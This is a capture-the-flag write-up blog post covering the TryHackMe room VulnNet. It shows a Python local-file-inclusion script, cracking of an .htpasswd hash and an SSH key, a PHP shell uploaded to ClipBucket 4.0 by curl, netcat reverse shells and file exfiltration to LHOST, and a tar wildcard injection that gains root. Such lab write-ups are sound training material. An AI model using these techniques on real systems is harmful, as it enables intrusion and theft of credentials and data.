@@ -1,0 +1,291 @@
+---
+layout: post
+title:  "TryHackMe - VulnNet"
+date:   2021-03-18 23:40:39 +0100
+categories: [ctf, writeups, tryhackme]
+---
+
+Link to the ctf: [VulnNet](https://tryhackme.com/room/vulnnet1)
+
+```
+# Nmap 7.91 scan initiated Thu Mar 18 16:30:12 2021 as: nmap -sV -sC -vv -p- -T5 -Pn -oN nmap.log vulnnet.thm
+Warning: 10.10.241.120 giving up on port because retransmission cap hit (2).
+Nmap scan report for vulnnet.thm (10.10.241.120)
+Host is up, received user-set (0.11s latency).
+Scanned at 2021-03-18 16:30:13 CET for 333s
+Not shown: 65533 closed ports
+Reason: 65533 resets
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
+|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
+|   256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: VulnNet
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Mar 18 16:35:47 2021 -- 1 IP address (1 host up) scanned in 334.55 seconds
+```
+
+I didn't find anything useful so I ran a VHOST enumeration
+```bash
+gobuster vhost --url http://vulnnet.thm --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  | grep -v 'Status: 400'
+```
+I found `broadcast.vulnnet.thm` that requires http authentication.
+
+In the source page `http://vulnnet.thm/` we see that at the bottom of the page, it's been imported 2 javascript files.
+
+![](/assets/Clipboard_2021-03-18-20-16-56.png)
+
+analyzing the javascript files using [de4js](https://lelinhtinh.github.io/de4js/) we see that one of them contains a special argument to pass at  `http://vulnnet.thm/index.php`
+
+![](/assets/Clipboard_2021-03-18-20-18-29.png)
+
+I tried several techinques until I realized there was a LFI (Local File Inclusion) vulnerability:
+
+![](/assets/Clipboard_2021-03-18-20-20-10.png)
+
+I then relized that the function deletes the `../` strings so to cirumnavigate it, I used `..//`.
+
+I created a script in python to better get the output since I didn't want to scroll back down everytime I issue a new value.
+
+```python
+#!/usr/bin/env python3
+import requests
+import sys
+s = requests.Session()
+
+if __name__ == "__main__":
+    DELIMETER1 = '''                </p>
+            </div>
+        </div>
+
+    </div>
+
+</div>'''
+    DELIMETER2 = '<script src="/js/index__7ed54732.js"></script>'
+    target = ""
+    argument = ""
+    try:
+        target = sys.argv[1]
+        argument = sys.argv[2]
+    except:
+        print(f"Usage: {sys.argv[0]} <ip/host> <file>")
+        exit()
+    argument = argument.replace("../", "..//")
+    print("TARGET:", target)
+    print("FILE:", argument)
+    r = s.get(f"http://{target}/?referer={argument}")
+    print(r.text.split(DELIMETER2)[0].split(DELIMETER1)[1])
+```
+
+And I use the script `./lfi.py vulnnet.thm /etc/passwd` 
+
+There is an interest line
+
+```
+server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
+```
+
+Knowing how apache works, I wanted to find the `.htpasswd` file for the subdomain `broadcast`.
+The config file `/etc/apache2/sites-enabled/000-default.conf` shows us a lot of information about http service.
+```xml
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        ServerName vulnnet.thm
+        DocumentRoot /var/www/main
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+        <Directory /var/www/main>
+                Order allow,deny
+                allow from all
+        </Directory>
+</VirtualHost>
+
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        ServerName broadcast.vulnnet.thm
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+        <Directory /var/www/html>
+                Order allow,deny
+                allow from all
+                AuthType Basic
+                AuthName "Restricted Content"
+                AuthUserFile /etc/apache2/.htpasswd
+                Require valid-user
+        </Directory>
+</VirtualHost>
+```
+
+We wanna focus on the second `VirtualHost`, where is in charge to define the `broadcast.vulnnet.thm` hostname.
+In fact, we see the line `AuthUserFile /etc/apache2/.htpasswd`
+
+Let's get that file and try to crack the password
+
+```
+developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
+```
+
+So we have `developers` as username.
+
+I used `john` to do the crack and used the wordlist `rockyou.txt`
+```bash
+john -w=/usr/share/wordlists/rockyou.txt crackme.txt
+```
+![](/assets/Clipboard_2021-03-18-21-16-30.png)
+
+
+Bingo, now we try to login at `broadcast.vulnnet.thm`.
+
+
+![](/assets/Clipboard_2021-03-18-21-17-50.png)
+
+We got a `clipbucket` instance. 
+
+On the Title name we see that Clipbucket is using the version `4.0`.
+
+I googled it and we found a few interesting vulnerabilities:
+
+![](/assets/Clipboard_2021-03-18-21-19-40.png)
+
+I used `searchsploit clipbucket` to look up for the vulnerability
+
+![](/assets/Clipboard_2021-03-18-22-06-35.png)
+I analyzed the last file with `searchsploit -x php/webapps/44250.txt`
+
+And decided to use the following exploit:
+
+```bash
+curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php" "http://$HOST/actions/photo_uploader.php"
+```
+
+We re gonna create a file called `lmao.php` and use [asio](https://github.com/jackrendor/asio) to generate a reverse shell
+
+```bash
+asio -H LHOST -P LPORT -A -B
+```
+I took the payload and put inside the `lmao.php` file rwapped in the php `system` function:
+```php
+<?php system("ASIO_PAYLOAD"); ?>
+```
+
+and then used the curl command, being careful to add the authentication header like so:
+```bash
+curl -F "file=@lmao.php" -F "plupload=1" -F "name=lmao.php" -u "developers:HTPASS_PASSOWRD" "http://broadcast.vulnnet.thm/actions/photo_uploader.php"
+```
+We're gonna get a response like this:
+```json
+{"success":"yes","file_name":"1616102314ebf8b6","extension":"php","file_directory":"2021\/03\/18"}
+```
+I opened a listener with netcat:
+```bash
+rlwrap nc -vlp 8080
+```
+I headed at `http://broadcast.vulnnet.thm/files/`, went into the `photos` folder and follow the path specified in the `file_directory` variable in the json response.
+We're gonna have our file with the same name as the value of `file_name`. 
+Clicking on it we get a reverse shell.
+
+## Privilege escalation - Lateral Movement
+
+First I stabilized my shell by issuing the following commands:
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+then I saw that in `/var/backups/` we have `ssh-backup.tar.gz`
+`-rw-rw-r--  1 server-management server-management    1484 Jan 24 14:08 ssh-backup.tar.gz`
+
+I moved this file to my PC by opening a netcat listener in my machine
+```bash
+nc -lvp 8000 > "ssh-backup.tar.gz"
+```
+
+and send the command to my machine by issuing another command with netcat in the remote server:
+```bash
+cat ssh-backup.tar.gz | nc LHOST 8000
+```
+
+I extracted the archive by using tar:
+```bash
+tar xvf ssh-backup.tar.gz
+```
+> NOTE: I always forget which argument pass to `tar` to extract the archive. Just thinking about e**X**tract **V**erbose **F**file
+
+and we have an `id_rsa`. Knowing that this file is owned by `server-management`, I supposed that it belongs to this user.
+But we have to crack it first:
+```bash
+/usr/share/john/ssh2john.py id_rsa > crackme
+john -w=/usr/share/wordlists/rockyou.txt crackme
+```
+
+and after finding the password, we can use it to login via ssh:
+
+```bash
+ssh -i id_rsa server-management@vulnnet.thm
+```
+
+## Privilege Escalation - Vertical Movement
+inside `/var/opt/` we see a file called `backupsrv.sh`
+```bash
+#!/bin/bash
+
+# Where to backup to.
+dest="/var/backups"
+
+# What to backup. 
+cd /home/server-management/Documents
+backup_files="*"
+
+# Create archive filename.
+day=$(date +%A)
+hostname=$(hostname -s)
+archive_file="$hostname-$day.tgz"
+
+# Print start status message.
+echo "Backing up $backup_files to $dest/$archive_file"
+date
+echo
+
+# Backup the files using tar.
+tar czf $dest/$archive_file $backup_files
+
+# Print end status message.
+echo
+echo "Backup finished"
+date
+
+# Long listing of files in $dest to check file sizes.
+ls -lh $dest
+```
+
+This file is called by `cronjob` after a while by using the user `root`
+
+![](/assets/Clipboard_2021-03-18-23-36-25.png)
+> NOTE: I used `linpeas.sh` to get those informations
+
+if we focus on the `tar` command, we see that we have chance to use the [wildcard injection](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
+
+so the source directory is `/home/server-management/Documents`, this is the place where we have to insert our _special files_.
+
+I created a file called `shell.sh` and added it the `asio` reverse shell.
+a file called `--checkpoint=1`
+and then `--checkpoint-action=exec=sh shell.sh`
+Now we can open a `netcat` listener as we did before
+
+and after a while, we should get root.
+
+![](/assets/Clipboard_2021-03-18-23-34-35.png)
+
